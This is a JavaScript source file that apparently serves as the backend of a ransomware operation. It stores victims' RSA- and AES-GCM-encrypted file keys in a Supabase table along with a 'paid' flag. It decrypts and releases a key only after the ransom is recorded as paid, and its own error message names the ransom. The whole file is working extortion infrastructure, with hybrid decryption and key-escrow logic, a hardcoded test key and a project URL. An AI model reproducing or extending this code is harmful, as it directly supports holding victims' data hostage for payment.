import { createClient } from '@supabase/supabase-js'
const rsa = require("node-rsa")
const fs = require("fs")
const crypto = require("crypto")


const testHash = "57e7ed6b4c5b7bc4fb77db9fe40aca306819c7af0d1287df301d8f877b671935"
const testKey = `8ee68b93e15abba3e66daff46f7f5d9cf5470b8034227efbee70385bbff8a4da4599136f0090d1ef462540969cf68339a772208e9c9e955d4a16b148fbabf896fcce8e759bf43d85f6bf3ad75d032fe288ca98cfe373f091acd5ff10b7879ad7adc84b2eb1d7a9b90088fc62b23f15e4dbb9ac90d997b9e70031d3b478808365d49c8fa1a3d1cdb29aa1708764e53954db5672115fd5ac5626c8f0c0e2b9070730c68a2957dba0e11c7a2ec801bd4f0833e49300287973068430d801ba82d4fd0f955ec2fcb7150ab70b84737a3b3d3821365f6f5d1babdfaadd28358ca9d43cf4830482063921d7dcb3ddb207efefc2da7d3e84294ea014c793155adc6c78fe`

const key = fs.readFileSync("./private.pem", "ascii")

const pkey = new rsa(key)
pkey.setOptions({
  environment: "browser", // SHA implementation varies 
  encryptionScheme: {
    hash: "sha1",
    scheme: "pkcs1_oaep"
  }
})

const supabaseUrl = 'https://amsvkdzwcxmodmgaktiq.supabase.co'
const supabaseKey = process.env.SUPABASE_KEY

const supabase = createClient(supabaseUrl, supabaseKey)

const auth = async (email, password) => {
  let { user, session, error } = await supabase.auth.signIn({
    email,
    password
  })
  if (error) {
    console.error(error)
    throw error
  }
  return { user, session }
}

const signUp = async (email, password) => {
  const { user, session, error } = await supabase.auth.signUp({
    email,
    password
  })
  if (error) {
    console.error(error)
    throw error
  }
  return { user, session }
}

const logout = async () => supabase.auth.signOut()

const userInfo = async token => supabase.auth.api.getUser(token)

const hybridDecrypt = (mKey) => {
  const encryptedPK = mKey.substring(0, mKey.length - 512)
  const encryptedAES = mKey.substring(mKey.length - 512, mKey.length)
  const decryptedAES = pkey.decrypt(Buffer.from(encryptedAES, "hex"), "buffer")

  const inputBuffer = Buffer.from(encryptedPK, 'hex');
  const ivLength = 12;
  const tagLength = 16;
  const iv = Buffer.allocUnsafe(ivLength);
  const tag = Buffer.allocUnsafe(tagLength);
  const data = Buffer.alloc(inputBuffer.length - ivLength - tagLength, 0);

  inputBuffer.copy(iv, 0, 0, ivLength);
  inputBuffer.copy(tag, 0, inputBuffer.length - tagLength);
  inputBuffer.copy(data, 0, ivLength);

  const decipher = crypto.createDecipheriv('aes-256-gcm', decryptedAES, iv)

  decipher.setAuthTag(tag);

  let dec = decipher.update(data, null, 'hex');
  dec += decipher.final('hex');
  return dec;
}

const postKey = async ({ key, hash, paid }) => {
  if (hash === testHash) {
    console.log("Testing detected")
    return [{ hash, encrypted_key: testKey, paid: true }]
  }
  try {
    const v3 = key.length > 512
    console.log("Entering!", { v3, key, hash, paid })
    let original
    if (v3) {
      original = Buffer.from(hybridDecrypt(key), "hex")
    } else {
      original = pkey.decrypt(Buffer.from(key, "hex"), "buffer")
    }
    const digest = crypto.createHash("sha256").update(original).digest("hex")
    console.log({
      original, digest, hash, v3
    })
    if (digest != hash) {
      return { error: "nope" }
    }
    return supabase.from("v2").insert([{
      hash,
      encrypted_key: key,
      paid: !!paid,
      v3: v3
    }])
  } catch (e) {
    console.error(e)
    return { error: "decryption failed" }
  }
}

const getPaidKeyByHash = async (hashId) => {
  if (hashId === testHash) {
    console.log("Testing detected")
    return {
      data: {
        status: "PAID",
        key: pkey.decrypt(Buffer.from(testKey, "hex")).toString("hex")
      }
    }
  }
  const { data, error } = await supabase.from("v2").select("encrypted_key,paid,v3").eq("hash", hashId)
  if (error) {
    return { error }
  }
  const res = data[0]
  if (!res) {
    return {
      error: {
        status: "NOT FOUND",
        message: "No key found"
      }
    }
  }
  if (!res.paid) {
    return {
      error: {
        status: "NOT PAID",
        message: `Ransom for selected key is not registered as paid at this moment`
      }
    }
  }
  const key = res.v3 ? hybridDecrypt(res.encrypted_key) : pkey.decrypt(Buffer.from(res.encrypted_key, "hex")).toString("hex")
  return {
    data: {
      status: "PAID",
      key
    }
  }
}

module.exports = {
  auth,
  signUp,
  logout,
  userInfo,
  postKey,
  getPaidKeyByHash
}
